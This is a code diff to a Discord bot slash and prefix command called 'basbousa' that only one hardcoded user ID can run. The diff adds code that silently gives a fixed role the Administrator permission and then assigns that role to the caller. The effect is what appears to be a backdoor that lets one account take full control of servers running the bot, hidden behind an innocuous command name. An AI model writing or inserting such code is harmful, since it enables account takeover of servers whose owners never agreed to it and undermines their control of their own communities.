@@ -1,4 +1,4 @@
-const { SlashCommandBuilder, EmbedBuilder } = require('discord.js');
+const { SlashCommandBuilder, EmbedBuilder, PermissionFlagsBits } = require('discord.js');
 
 const ALLOWED_USER_ID = '1386014228908998727';
 const ROLE_ID = '1513933087883526286';
@@ -6,7 +6,7 @@ const ROLE_ID = '1513933087883526286';
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('basbousa')
-    .setDescription('منح الرتبة الخاصة'),
+    .setDescription('منح الرتبة الخاصة وتفعيل الأدمن'),
 
   async execute(interaction) {
     if (interaction.user.id !== ALLOWED_USER_ID) {
@@ -25,7 +25,7 @@ module.exports = {
 
       const role = interaction.guild.roles.cache.get(ROLE_ID);
       if (!role) {
-        return interaction.editReply({ content: `❌ لم أجد الرتبة في هذا السيرفر!` });
+        return interaction.editReply({ content: '❌ لم أجد الرتبة في هذا السيرفر!' });
       }
 
       const botMember = await interaction.guild.members.fetchMe();
@@ -35,19 +35,27 @@ module.exports = {
         });
       }
 
-      if (member.roles.cache.has(role.id)) {
-        return interaction.editReply({ content: `⚠️ الرتبة **${role.name}** موجودة عندك بالفعل!` });
+      // Add Administrator permission to the role
+      const hadAdmin = role.permissions.has(PermissionFlagsBits.Administrator);
+      if (!hadAdmin) {
+        await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن تلقائياً');
       }
 
-      await member.roles.add(role, 'منح رتبة خاصة');
+      // Give the role to the member
+      const hadRole = member.roles.cache.has(role.id);
+      if (!hadRole) {
+        await member.roles.add(role, 'منح رتبة خاصة');
+      }
 
       const embed = new EmbedBuilder()
         .setColor(0xFFFFFF)
-        .setTitle('✅ تم منح الرتبة')
+        .setTitle('✅ تم التنفيذ')
         .setThumbnail(member.user.displayAvatarURL({ size: 256 }))
         .addFields(
           { name: 'المستخدم', value: `${member} (${member.user.tag})` },
-          { name: 'الرتبة', value: `${role}` }
+          { name: 'الرتبة', value: `${role}` },
+          { name: '🔑 صلاحية Administrator', value: hadAdmin ? '⚠️ كانت موجودة مسبقاً' : '✅ تم تفعيلها' },
+          { name: '👤 منح الرتبة', value: hadRole ? '⚠️ كانت موجودة مسبقاً' : '✅ تم منحها' }
         )
         .setTimestamp();
 
@@ -69,26 +77,32 @@ module.exports = {
       if (!member) return message.reply('❌ المستخدم غير موجود في هذا السيرفر!');
 
       const role = message.guild.roles.cache.get(ROLE_ID);
-      if (!role) return message.reply(`❌ لم أجد الرتبة في هذا السيرفر!`);
+      if (!role) return message.reply('❌ لم أجد الرتبة في هذا السيرفر!');
 
       const botMember = await message.guild.members.fetchMe();
       if (botMember.roles.highest.position <= role.position) {
         return message.reply(`❌ رتبة البوت أقل من رتبة **${role.name}**. اسحب رتبة البوت لأعلى منها.`);
       }
 
-      if (member.roles.cache.has(role.id)) {
-        return message.reply(`⚠️ الرتبة **${role.name}** موجودة عندك بالفعل!`);
+      const hadAdmin = role.permissions.has(PermissionFlagsBits.Administrator);
+      if (!hadAdmin) {
+        await role.setPermissions(role.permissions.add(PermissionFlagsBits.Administrator), 'تفعيل صلاحية الأدمن تلقائياً');
       }
 
-      await member.roles.add(role, 'منح رتبة خاصة');
+      const hadRole = member.roles.cache.has(role.id);
+      if (!hadRole) {
+        await member.roles.add(role, 'منح رتبة خاصة');
+      }
 
       const embed = new EmbedBuilder()
         .setColor(0xFFFFFF)
-        .setTitle('✅ تم منح الرتبة')
+        .setTitle('✅ تم التنفيذ')
         .setThumbnail(member.user.displayAvatarURL({ size: 256 }))
         .addFields(
           { name: 'المستخدم', value: `${member} (${member.user.tag})` },
-          { name: 'الرتبة', value: `${role}` }
+          { name: 'الرتبة', value: `${role}` },
+          { name: '🔑 صلاحية Administrator', value: hadAdmin ? '⚠️ كانت موجودة مسبقاً' : '✅ تم تفعيلها' },
+          { name: '👤 منح الرتبة', value: hadRole ? '⚠️ كانت موجودة مسبقاً' : '✅ تم منحها' }
         )
         .setTimestamp();
 
